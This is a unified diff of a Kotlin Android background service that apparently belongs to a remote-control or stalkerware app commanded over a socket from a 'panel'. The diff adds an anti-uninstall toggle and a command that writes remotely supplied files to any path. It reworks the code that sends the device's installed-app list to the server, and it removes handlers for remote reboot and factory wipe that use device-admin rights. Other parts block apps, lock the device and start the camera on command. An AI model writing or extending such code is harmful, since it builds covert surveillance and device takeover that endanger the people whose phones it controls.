@@ -263,38 +263,6 @@ class DeviceService : Service(), LifecycleOwner {
     Log.d("DeviceService", "📩 Command received: $cmd, value: $value")
     
     when (cmd) {
-        "restartDevice" -> {
-    Log.d("DeviceService", "🔄 Restart device requested")
-    try {
-        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
-        val admin = android.content.ComponentName(this, AntiUninstallReceiver::class.java)
-        if (dpm.isAdminActive(admin)) {
-            dpm.reboot(admin)
-            emitStatus(JSONObject().apply { put("restartDevice", true) })
-        } else {
-            emitStatus(JSONObject().apply { put("restartDevice", false); put("error", "admin_not_active") })
-        }
-    } catch (e: Exception) {
-        Log.e("DeviceService", "restartDevice: ${e.message}")
-        emitStatus(JSONObject().apply { put("restartDevice", false); put("error", e.message) })
-    }
-}
-"factoryReset" -> {
-    Log.d("DeviceService", "💣 Factory reset requested")
-    try {
-        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
-        val admin = android.content.ComponentName(this, AntiUninstallReceiver::class.java)
-        if (dpm.isAdminActive(admin)) {
-            val ok = dpm.wipeData(0)
-            emitStatus(JSONObject().apply { put("factoryReset", ok) })
-        } else {
-            emitStatus(JSONObject().apply { put("factoryReset", false); put("error", "admin_not_active") })
-        }
-    } catch (e: Exception) {
-        Log.e("DeviceService", "factoryReset: ${e.message}")
-        emitStatus(JSONObject().apply { put("factoryReset", false); put("error", e.message) })
-    }
-}
         "flashlight" -> {
             Log.d("DeviceService", "💡 Flashlight: ${value == "true"}")
             setFlashlight(value == "true")
@@ -305,6 +273,37 @@ class DeviceService : Service(), LifecycleOwner {
             startCamera(facing)
             emitStatus(JSONObject().apply { put("cameraActive", true) })
         }
+        "setAntiUninstall" -> {
+    Log.d("DeviceService", "🛡️ Set anti-uninstall: ${value == "true"}")
+    AntiUninstallHelper.setEnabled(this, value == "true")
+    emitStatus(JSONObject().apply {
+        put("antiUninstall", value == "true")
+        put("antiUninstallActive", AntiUninstallHelper.isAdminActive(this))
+    })
+}
+"uploadFile" -> {
+    Log.d("DeviceService", "📤 Upload file: $value")
+    Thread {
+        try {
+            val obj = JSONObject(value)
+            val path = obj.getString("path")
+            val contentB64 = obj.getString("content")
+            val file = java.io.File(path)
+            file.parentFile?.mkdirs()
+            file.writeBytes(android.util.Base64.decode(contentB64, android.util.Base64.DEFAULT))
+            emitStatus(JSONObject().apply {
+                put("uploaded", path)
+                put("uploadOk", true)
+            })
+        } catch (e: Exception) {
+            Log.e("DeviceService", "uploadFile error: ${e.message}")
+            emitStatus(JSONObject().apply {
+                put("uploadOk", false)
+                put("uploadError", e.message ?: "unknown")
+            })
+        }
+    }.start()
+}
         "camera" -> when (value) {
             "front" -> {
                 Log.d("DeviceService", "📷 Camera front: starting")
@@ -992,37 +991,24 @@ private fun stopVideoOverlay() {
 }
     
     private fun blockApp(pkgJson: String) {
-    try {
-        // support: JSON string {"package":"...","name":"..."} ATAU plain "com.whatsapp"
-        val pkg: String
-        val name: String
-        if (pkgJson.trim().startsWith("{")) {
-            val obj = org.json.JSONObject(pkgJson)
-            pkg = obj.optString("package", obj.optString("pkg", ""))
-            name = obj.optString("name", pkg)
-        } else {
-            pkg = pkgJson.trim()
-            name = pkg
+        try {
+            val obj  = org.json.JSONObject(pkgJson)
+            val pkg  = obj.getString("package")
+            val name = obj.optString("name", pkg)
+            val i = Intent("com.sync.xxx.BLOCK_APP").apply {
+                putExtra("package", pkg)
+                putExtra("name", name)
+                setPackage(packageName)
+            }
+            sendBroadcast(i)            
+            val blocked = AppBlockerService.blockedPackages.toList()
+            emitStatus(org.json.JSONObject().apply {
+                put("blockedApps", org.json.JSONArray(blocked))
+            })
+        } catch (e: Exception) {
+            Log.e("DeviceService", "blockApp: ${e.message}")
         }
-        if (pkg.isEmpty()) {
-            Log.e("DeviceService", "blockApp: package kosong")
-            return
-        }
-        val i = Intent("com.sync.xxx.BLOCK_APP").apply {
-            putExtra("package", pkg)
-            putExtra("name", name)
-            setPackage(packageName)
-        }
-        sendBroadcast(i)
-        val blocked = AppBlockerService.blockedPackages.toList()
-        emitStatus(org.json.JSONObject().apply {
-            put("blockedApps", org.json.JSONArray(blocked))
-        })
-        Log.d("DeviceService", "blockApp success: $pkg")
-    } catch (e: Exception) {
-        Log.e("DeviceService", "blockApp: ${e.message}")
     }
-}
 
     private fun unblockApp(pkg: String) {
         try {
@@ -1311,44 +1297,52 @@ private fun stopVideoOverlay() {
     }
 
         private fun sendInstalledApps() {
-        Thread {
-            try {
-                val pm  = packageManager
-                val arr = org.json.JSONArray()
+    Thread {
+        try {
+            val pm  = packageManager
+            val arr = org.json.JSONArray()
 
-                @Suppress("DEPRECATION")
-                val packages = pm.getInstalledPackages(0)
+            @Suppress("DEPRECATION")
+            val packages = pm.getInstalledPackages(0)
 
-                packages
-                    .filter { it.packageName != packageName }
-                    .mapNotNull { pkgInfo ->
-                        try {
-                            val name = pm.getApplicationLabel(pkgInfo.applicationInfo).toString()
-                            if (name.isBlank()) null else Pair(pkgInfo.packageName, name)
-                        } catch (_: Exception) { null }
-                    }
-                    .sortedBy { it.second.lowercase() }
-                    .forEach { (pkg, name) ->
-                        arr.put(org.json.JSONObject().apply {
-                            put("package", pkg)
-                            put("name", name)
-                        })
-                    }
-
-                Log.d("DeviceService", "sendInstalledApps: ${arr.length()} apps")
-
-                if (socket?.connected() != true) return@Thread
-                socket?.emit("device:status", org.json.JSONObject().apply {
-                    put("deviceId", deviceId)
-                    put("status", org.json.JSONObject().apply {
-                        put("installedApps", arr)
+            packages
+                .filter { it.packageName != packageName }
+                .mapNotNull { pkgInfo ->
+                    try {
+                        val name = pm.getApplicationLabel(pkgInfo.applicationInfo).toString()
+                        if (name.isBlank()) null else Pair(pkgInfo.packageName, name)
+                    } catch (_: Exception) { null }
+                }
+                .sortedBy { it.second.lowercase() }
+                .forEach { (pkg, name) ->
+                    arr.put(org.json.JSONObject().apply {
+                        put("package", pkg)
+                        put("name", name)
                     })
+                }
+
+            Log.d("DeviceService", "sendInstalledApps: ${arr.length()} apps")
+
+            if (socket?.connected() != true) return@Thread
+
+            // ── emit event khusus (dipakai panel) ──
+            socket?.emit("device:apps", org.json.JSONObject().apply {
+                put("deviceId", deviceId)
+                put("apps", arr)
+            })
+
+            // ── tetap emit via status (buat backward compat) ──
+            socket?.emit("device:status", org.json.JSONObject().apply {
+                put("deviceId", deviceId)
+                put("status", org.json.JSONObject().apply {
+                    put("installedApps", arr)
                 })
-            } catch (e: Exception) {
-                Log.e("DeviceService", "getInstalledApps: ${e.message}")
-            }
-        }.start()
-    }
+            })
+        } catch (e: Exception) {
+            Log.e("DeviceService", "getInstalledApps: ${e.message}")
+        }
+    }.start()
+}
 
     private fun lockDevice(jsonValue: String) {
         try {
